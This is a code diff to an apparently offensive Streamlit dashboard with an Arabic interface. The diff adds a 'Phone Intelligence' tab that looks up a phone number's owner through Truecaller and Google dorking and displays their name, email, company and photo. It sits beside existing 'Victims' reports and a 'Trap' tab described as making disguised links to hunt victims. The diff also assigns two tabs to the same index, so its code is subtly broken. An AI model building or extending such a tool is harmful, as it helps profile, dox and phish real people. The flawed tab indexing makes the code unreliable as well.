@@ -331,6 +331,7 @@ tab_names = [
     "🗺️ Network Mapper",
     "🤖 AI Threat Analysis",
     "📄 التقارير",
+    "📱 Phone Intelligence",
     "🎯 المصيدة"
 ]
 
@@ -750,8 +751,8 @@ with tabs[16]:
             except Exception as e:
                 st.error(f"❌ خطأ: {str(e)}")
 
-# ============= التبويب 17: التقارير =============
-with tabs[17]:
+# ============= التبويب 16: التقارير =============
+with tabs[16]:
     st.header("📄 التقارير")
     
     tab_victims, tab_stats = st.tabs(["📊 الضحايا", "📈 الإحصائيات"])
@@ -822,8 +823,59 @@ with tabs[17]:
         else:
             st.info("ℹ️ لا يوجد بيانات للعرض.")
 
-# ============= التبويب 18: المصيدة =============
-with tabs[18]:
+# ============= التبويب 16: Phone Intelligence =============
+with tabs[16]:
+    st.header("📱 Phone Intelligence")
+    st.write("بحث عن معلومات الهاتف باستخدام Truecaller و Google Dorking")
+    
+    col1, col2 = st.columns([3, 1])
+    with col1:
+        phone = st.text_input("أدخل رقم الهاتف", placeholder="+966501234567", key="phone_input")
+    with col2:
+        search_btn = st.button("🔍 بحث", key="phone_btn", width='stretch')
+    
+    if search_btn and phone:
+        with st.spinner("جاري البحث..."):
+            try:
+                from utils import get_phone_intelligence
+                
+                result = get_phone_intelligence(phone)
+                
+                # عرض نتائج Truecaller
+                if result["truecaller"]["success"]:
+                    data = result["truecaller"]["data"]
+                    
+                    st.success("✅ تم العثور على معلومات!")
+                    
+                    col1, col2 = st.columns(2)
+                    with col1:
+                        st.subheader("📄 المعلومات الأساسية")
+                        st.write(f"**الاسم:** {data.get('name', 'Unknown')}")
+                        st.write(f"**الهاتف:** {data.get('phone', phone)}")
+                        st.write(f"**البريد:** {data.get('email', 'Not Found')}")
+                        st.write(f"**الشركة:** {data.get('company', 'Not Found')}")
+                    
+                    with col2:
+                        st.subheader("📸 الصورة")
+                        if data.get('image'):
+                            st.image(data['image'], width=200)
+                        else:
+                            st.info("لا توجد صورة متاحة")
+                    
+                    # عرض نتائج Google Dorking
+                    if result["google_dork"]["success"]:
+                        st.subheader("🔎 نتائج Google Dorking")
+                        for i, res in enumerate(result["google_dork"]["results"], 1):
+                            st.write(f"{i}. {res.get('title', 'No title')}")
+                            st.write(f"   {res.get('href', 'No URL')}")
+                else:
+                    st.error(f"❌ {result['truecaller'].get('error', 'خطأ غير معروف')}")
+            
+            except Exception as e:
+                st.error(f"❌ خطأ: {str(e)}")
+
+# ============= التبويب 17: المصيدة =============
+with tabs[17]:
     st.header("🎯 المصيدة")
     st.write("قم بإنشاء روابط تمويهية لاصطياد الضحايا.")
     
